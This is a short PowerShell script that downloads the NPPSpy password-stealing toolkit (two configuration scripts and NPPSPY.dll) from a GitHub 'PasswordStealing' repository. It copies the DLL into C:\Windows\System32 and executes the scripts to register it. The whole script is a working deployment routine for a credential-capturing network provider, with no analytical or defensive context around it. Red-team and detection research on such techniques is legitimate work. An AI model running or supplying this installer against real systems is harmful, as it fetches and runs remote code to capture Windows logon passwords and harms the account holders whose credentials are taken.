# Define file URLs and paths
$ps1Script1Url = "https://github.com/gtworek/PSBits/raw/master/PasswordStealing/NPPSpy/ConfigureRegistrySettings.ps1"
$ps1Script2Url = "https://github.com/gtworek/PSBits/raw/master/PasswordStealing/NPPSpy/Get-NetworkProviders.ps1"
$dllFileUrl = "https://github.com/gtworek/PSBits/raw/master/PasswordStealing/NPPSpy/NPPSPY.dll"

$tempDir = "C:\Temp"
$system32Dir = "C:\Windows\System32"
$ps1Script1Path = "$tempDir\ConfigureRegistrySettings.ps1"
$ps1Script2Path = "$tempDir\Get-NetworkProviders.ps1"
$tempDllPath = "$tempDir\NPPSPY.dll"
$system32DllPath = "$system32Dir\NPPSPY.dll"

# Ensure the temporary directory exists
if (!(Test-Path -Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir | Out-Null
}

# Function to download a file
function Download-File {
    param (
        [string]$Url,
        [string]$OutputPath
    )
    Write-Host "Downloading $Url to $OutputPath"
    Invoke-WebRequest -Uri $Url -OutFile $OutputPath -ErrorAction Stop
}

# Download the files
try {
    Download-File -Url $ps1Script1Url -OutputPath $ps1Script1Path
    Download-File -Url $ps1Script2Url -OutputPath $ps1Script2Path
    Download-File -Url $dllFileUrl -OutputPath $tempDllPath
    Write-Host "All files downloaded successfully."
} catch {
    Write-Error "Failed to download files: $_"
    exit 1
}

# Move the DLL file to System32
try {
    Write-Host "Moving DLL file to $system32Dir"
    Move-Item -Path $tempDllPath -Destination $system32DllPath -Force
    Write-Host "DLL moved successfully."
} catch {
    Write-Error "Failed to move DLL file: $_"
    exit 1
}

# Execute the PowerShell scripts
try {
    Write-Host "Executing $ps1Script1Path"
    & $ps1Script1Path

    Write-Host "Executing $ps1Script2Path"
    & $ps1Script2Path

    Write-Host "PowerShell scripts executed successfully."
} catch {
    Write-Error "Failed to execute PowerShell scripts: $_"
    exit 1
}

Write-Host "All tasks completed successfully."
